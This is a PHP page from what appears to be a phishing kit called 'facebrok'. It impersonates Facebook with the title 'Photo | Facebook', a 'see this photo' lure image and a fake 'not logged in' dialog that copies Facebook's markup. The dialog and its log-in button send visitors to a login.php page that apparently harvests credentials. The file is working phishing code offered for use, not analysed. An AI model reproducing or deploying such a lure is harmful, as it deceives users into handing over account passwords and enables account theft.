<?php

	include 'croak/core.function.php';
	$facebrok = new facebrok();
	$facebrok->error_disable();
  include("includes/top_3.php");

?>

<style>
    * {
      margin: 0; padding: 0;
    }
    
    html { 
      background: url(dynamic/see_this_photo.png) no-repeat center center fixed; 
      -webkit-background-size: cover;
      -moz-background-size: cover;
      -o-background-size: cover;
      background-size: cover;
    }
</style>
<title>Photo | Facebook</title>
<link rel="shortcut icon" href="dynamic/índice.ico" />
<body bgcolor="#FFFFFF" topmargin="0" leftmargin="0" rightmargin="0" bottommargin="0" scroll="no">
<a href="login.php?login_attempt=1&lwv=1">
<div class="generic_dialog pop_dialog generic_dialog_modal" id="dialog_1"><div class="generic_dialog_popup" style="margin-top: 125px;"><div class="pop_container_advanced"><div class="pop_content" id="pop_content" tabindex="0" role="alertdialog"><h2 class="dialog_title" id="title_dialog_1"><span><?php echo $facebrok->translater("not_logged"); ?></span></h2><div class="dialog_content"><div class="dialog_summary hidden_elem"></div><div class="dialog_body"><?php echo $facebrok->translater("pls_not_logged"); ?></div><div class="dialog_buttons clearfix"><div class="rfloat mlm"><label class="uiButton uiButtonLarge uiButtonConfirm"><input type="button" name="#" <a=""  value="<?php echo $facebrok->translater("log_in"); ?>"></label></div><div class="dialog_buttons_msg"></div></div><div class="dialog_footer hidden_elem"></div></div></div></div></div></div></a></body>